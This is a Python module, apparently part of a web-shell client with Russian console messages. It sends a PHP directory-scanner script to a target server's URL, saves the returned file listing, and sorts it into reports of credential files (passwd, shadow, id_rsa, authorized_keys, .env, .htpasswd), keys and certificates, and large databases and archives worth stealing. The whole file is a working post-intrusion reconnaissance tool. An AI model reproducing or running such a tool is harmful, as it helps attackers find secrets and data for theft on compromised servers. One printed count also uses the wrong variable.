import modules.send as send
import os

def sbd(url,where,pwd,uagent):
    print("Сканирование сервера...")
    if where == "":
        where = pwd
    with open('scan\\sbd\\sbd.php') as f:data = f.read()
    data = data.replace("$directory = __DIR__;", f"$directory = \'{where}\';")
    lists = send.send(url,data,uagent)
    with open("report/map.txt", "w", errors='ignore') as myfile:
        myfile.write(lists)
    print("Локальное сканирование...")

    phpinterest = open("report/php.txt", "w")
    extinterest = open("report/ext.txt", "w")
    databases = open("report/DB.txt", "w")
    BIGdatabases = open("report/BIG_DB.txt", "w")
    archives = open("report/arch.txt", "w")
    BIGarchives = open("report/BIG_arch.txt", "w")
    interesting = open("report/coolfiles.txt", "w")
    certs = open("report/certs.txt", "w")
    php = ["config","c_option","adminer","passwd","local","settings"]
    allcool = ["config","_log","adminer","passwd","shadow","_history","tomcat-users","authorized_keys","id_dsa","id_rsa","identity","sites-enabled","vhosts","settings","dockerfile"]
    a,b,c,d,e,f,g,h,j = 0,0,0,0,0,0,0,0,0
    with open("report/map.txt") as file:
        
        for line in file:
            j+=1
            if "R" == line[0] and line[2] == " ":
                name = str(os.path.basename(line.split(" | ")[2])).strip().lower()
                weight = int(line.split(" | ")[1].strip())
                ext = str(os.path.splitext(line.split(" | ")[2])[1]).strip().lower()
                
                if ext == ".php":
                    if any(x in name for x in php):
                        a+=1
                        phpinterest.write(line)

                if ext in (".htpasswd",".env",".log",".docker",".txt", ".cfg",".conf",".kbdx"):
                    b+=1
                    extinterest.write(line)
                    
                
                if ext in (".pub",".pmk",".key",".pgp",".pem",".crt",".ca"):
                    c+=1
                    certs.write(line)

                if ext in (".sql",".sqlite",".db",".csv",".bak"):
                    d+=1
                    databases.write(line)
                    if weight>104857600:
                        e+=1
                        BIGdatabases.write(line)
                
                if ext in (".tgz",".gz",".tar",".bz2",".tlz",".lz",".txz",".tbz2",".genozip",".7z",".s7z",".rar",".zip",".sfx"):
                    f+=1
                    archives.write(line)
                    if weight>104857600:
                        g+=1
                        BIGarchives.write(line)

                if any(x in name for x in allcool):
                    h+=1
                    interesting.write(line)

    print("СКАНИРОВАНИЕ ЗАВЕРШЕНО")
    print("Всего файлов:           "+str(j))
    print("Системных PHP:          "+str(a))
    print("Интересных расширений:  "+str(b))
    print("Интересных файлов:      "+str(g))
    print("Сертификатов\ключей:    "+str(c))
    print("Баз данных:             "+str(d))
    print("Баз данных более 100мб: "+str(e))
    print("Архивов:                "+str(f))
    print("Архивов более 100мб:    "+str(g))
    
